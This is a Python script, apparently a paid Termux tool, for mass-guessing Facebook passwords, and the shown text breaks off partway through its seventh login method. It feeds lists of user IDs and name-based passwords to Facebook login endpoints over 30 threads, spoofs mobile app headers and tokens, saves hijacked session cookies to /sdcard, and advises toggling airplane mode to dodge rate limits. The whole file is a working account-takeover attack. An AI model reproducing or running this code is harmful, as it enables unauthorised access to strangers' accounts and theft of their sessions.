""" source by Tamim Ahmed >> MR-GREEN"""
#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx
import os,time,string,random,json,uuid,sys,re,requests,io,pycurl
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = []
#──────────────{ COLOUR }──────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
#──────────────{ LINEX }──────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}─────────────────────────────────────────────────')
#──────────────{ UA-M1 }──────────────#
def __fuck1__():
	model = random.choice(["CPH1931","CPH1803","CPH1909","CPH1901","PDBM00","CPH2083"])
	ufff = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/"+"{density=2.0,width=720,height=1456}"+f";FBLC/en_US;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.1.0;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
	return ufff
#──────────────{ UA-M2 }──────────────#
def __fuck2__():
	model = random.choice(["RMX2185","RMX2189","RMX2180","RMX2101","RMX3063","RMX3201","RMX3193","RMX2151","RMX3085","RMX2193"])
	ufff = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/"+"{density=2.25,width=720,height=1400}"+";FBLC/en_Qaau_US;FBRV/369757394;FBCR/Grameenphone;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/1;FBCA/arm64-v8a:;]"
	return ufff
#──────────────{ LOGO }──────────────#
logo = f"""
     {A} _     _ _______ ______  _____ ______ \n     {A} |_____| |_____| |_____]   |   |_____]\n     {A} |     | |     | |_____] __|__ |_____]\n{A}─────────────────────────────────────────────────\n{A}|=| OWNER   : HABIB HOSSAIN\n{A}|=| TOOL    : FILE/RANDOM/GMAIL CLONING\n{A}|=| VERSION : 1.2\n{A}─────────────────────────────────────────────────"""
#──────────────{ APPROVAL }──────────────#
def approval():
     kns=str(os.geteuid())
     ki=str(uuid.uuid4()).replace('-','').upper()
     try:ak=open('/data/data/com.termux/files/usr/lib/python3.11/multiprocessing/resource_.py','r').read()
     except:open('/data/data/com.termux/files/usr/lib/python3.11/multiprocessing/resource_.py','w').write(ki)
     ak=open('/data/data/com.termux/files/usr/lib/python3.11/multiprocessing/resource_.py','r').read()
     key=kns+''+ak[:25]
     url=f"https://swag-gang-xd.blogspot.com/2024/02/approval.html?m=1"
     req=requests.get(url).text
     srvr = re.findall("srver=(.*)=srver", req)[0]
     if 'ON' in srvr:
         os.system('clear')
         print(f"{A}|=| TOOLS UPDATE DONE");time.sleep(0.5)
     if 'OF' in srvr:
         os.system('clear')
         for i in range(20000):
             print(f"{A}|=| WAIT FOR NEXT NEW UPDATE ")
             time.sleep(0.5)
         exit()
     if key in req:
         buffer = io.BytesIO()
         curl = pycurl.Curl()
         curl.setopt(curl.URL,url)
         curl.setopt(curl.WRITEDATA, buffer)
         curl.perform()
         curl.close()
         res = buffer.getvalue().decode("utf-8")
         if key in res:menu(kns)
         else:
              clear()
              print(f"{A}|=| YOUR KEY :{G} {key} ")
              print(f"{A}|=| TOOL IS PAID {G}|{A} CONTACT ADMIN ")
              os.system('xdg-open https://www.facebook.com/swagxxxd')
              exit(f"{A}|=| YOUR KEY NOT APPROVED ")
     clear()
     print(f"{A}|=| YOUR KEY :{G} {key} ")
     print(f"{A}|=| TOOL IS PAID {G}|{A} CONTACT ADMIN ")
     os.system('xdg-open https://www.facebook.com/swagxxxd')
     exit(f"{A}|=| YOUR KEY NOT APPROVED ")
#──────────────{ MENU }──────────────#
def menu(kns):
    clear()
    pks=input(f"{A}|=| YOUR LICENCE :{G} ")
    if not kns in pks:menu(kns)
    clear()
    print(f"{A}|1| FILE CLONING");print(f"{A}|2| RANDOM CLONING");print(f"{A}|3| GMAIL CLONING");print(f"{A}|4| EXIT CLONING");linex();option = input(f'{A}|?| CHOICE : ')
    if option in ['A','1']:__Filex__()
    elif option in ['B','2']:print(f"{A}|=| COMING SOON ");exit()
    elif option in ['C','3']:__Gmailx__()
    elif option in ['D','4']:exit()
    else:
        print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ FILE }──────────────#
def __Filex__():
    clear()
    print(f"{A}|=| EXAMPLE : /sdcard/HABIB.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}|=| FILE NOT FOUND...');time.sleep(1);__Filex__()
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");print(f"{A}|6| METHOD M6 ");print(f"{A}|7| METHOD M7 ");print(f"{A}|8| METHOD M8 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{A}|?| PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    clear()
    print(f"{A}|=| EXAMPLE : firstlast | first123 |ETC| ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{A}|=| PASSWORD NO.{i+1} :{G} '))
    with ThreadPool(max_workers=30) as habibx:
        clear();total_ids = str(len(dx))
        print(f"{A}|=| FILE UID {G}|{A} PASSWORD :{G} {total_ids} {G}|{Y} {pass_lmit} ");print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if methodx in ['1']:habibx.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']:habibx.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:habibx.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:habibx.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:habibx.submit(__file_M5__,ids,names,passlist)
            if methodx in ['6']:habibx.submit(__file_M6__,ids,names,passlist)
            if methodx in ['7']:habibx.submit(__file_M7__,ids,names,passlist)
            if methodx in ['8']:habibx.submit(__file_M8__,ids,names,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ FILE-METHOD-M1 }──────────────#
def __file_M1__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SWAG-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": __fuck1__(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SWAG-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SWAG-CP| '+ids+f' | '+pas)
                open('/sdcard/SWAG-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M2 }──────────────#
def __file_M2__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SWAG-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {'User-Agent': __fuck2__(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SWAG-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SWAG-CP| '+ids+f' | '+pas)
                open('/sdcard/SWAG-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M3 }──────────────#
def __file_M3__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SWAG-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SWAG-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SWAG-CP| '+ids+f' | '+pas)
                open('/sdcard/SWAG-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M4 }──────────────#
def __file_M4__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SWAG-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SWAG-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SWAG-CP| '+ids+f' | '+pas)
                open('/sdcard/SWAG-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M5 }──────────────#
def __file_M5__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SWAG-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SWAG-M5-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SWAG-CP| '+ids+f' | '+pas)
                open('/sdcard/SWAG-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M6 }──────────────#
def __file_M6__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SWAG-M6| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SWAG-M6-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SWAG-CP| '+ids+f' | '+pas)
                open('/sdcard/SWAG-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M7 }──────────────#
def __file_M7__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SWAG-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SWAG-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|SWAG-CP| '+ids+f' | '+pas)
